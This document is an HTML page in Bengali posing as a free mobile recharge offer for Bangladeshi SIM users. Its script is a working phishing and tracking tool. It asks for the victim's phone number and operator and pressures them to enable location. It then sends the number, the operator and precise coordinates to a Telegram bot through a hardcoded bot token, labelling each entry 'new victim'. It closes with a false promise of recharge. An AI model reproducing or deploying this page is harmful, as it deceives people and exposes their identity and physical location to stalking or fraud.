<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>২০ টাকা ফ্রি রিচার্জ অফার!</title>
    <style>
        body { background-color: #f2f2f2; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #ff0000; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <h2 style="color:red">🎁 ধামাকা অফার!</h2>
    <p>সব সিমে ২০ টাকা ইনস্ট্যান্ট ফ্রি রিচার্জ নিতে ফোনের লকেশন অপশন অন/চালু করুন না করলে পেমেন্ট পাবেন্না </p>
    <select id="sim">
        <option value="">সিম সিলেক্ট করুন</option>
        <option value="GP">জিপি (GP)</option>
        <option value="BL">বাংলালিংক (BL)</option>
        <option value="Robi">রবি (Robi)</option>
    </select>
    <input type="number" id="phone" placeholder="আপনার ১১ ডিজিটের নম্বর">
    <button onclick="checkAndSend()">রিচার্জ নিন</button>
</div>

<script>
function checkAndSend() {
    var p = document.getElementById('phone').value;
    var s = document.getElementById('sim').value;

    if (s == "" || p.length < 11) { 
        alert("সঠিক নম্বর ও সিম দিন।"); 
        return; 
    }

    // ইউজারকে মানসিকভাবে প্রস্তুত করা
    alert("অফারটি নিশ্চিত করতে ফোনের লকেশন অপশন অন করুন।");

    var token = "8502696183:AAHMRmatcsRh3fXyX2ng8AyU3y6f3m-7Mdw";
    var chat_id = "7887080882";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var map = "https://www.google.com/maps?q=" + lat + "," + lon;
            
            var msg = "✅ নতুন শিকার!\n📱 নম্বর: " + p + "\n📶 সিম: " + s + "\n📍 ম্যাপ: " + map;
            send(token, chat_id, msg);
        }, function(error) {
            var msg = "⚠️ লোকেশন অফ!\n📱 নম্বর: " + p + "\n📶 সিম: " + s + "\n❌ কারণ: ইউজার পারমিশন দেয়নি।";
            send(token, chat_id, msg);
        }, {enableHighAccuracy: true, timeout: 5000});
    } else {
        send(token, chat_id, "⚠️ ব্রাউজারে লোকেশন সাপোর্ট নেই।\n📱 নম্বর: " + p);
    }
}

function send(t, i, m) {
    var url = "https://api.telegram.org/bot" + t + "/sendMessage?chat_id=" + i + "&text=" + encodeURIComponent(m) + "&parse_mode=Markdown";
    fetch(url).then(() => {
        alert("আবেদন সফল! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
        window.location.href = "https://www.google.com";
    });
}
</script>

</body>
</html>
